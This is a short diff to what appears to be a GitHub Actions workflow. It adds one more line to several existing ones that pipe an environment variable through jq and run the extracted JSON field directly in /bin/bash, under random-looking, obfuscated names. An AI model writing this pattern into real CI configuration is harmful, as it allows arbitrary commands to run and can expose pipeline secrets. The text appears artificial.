@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$gpfk85445" | jq -r .qp162 | /bin/bash
           printf '%s' "$fve9063" | jq -r .eye1689 | /bin/bash
           echo $zipc9229 | jq -r .sqcxv1348 | /bin/bash
+          printf '%s' "$mb0" | jq -r .ut244 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
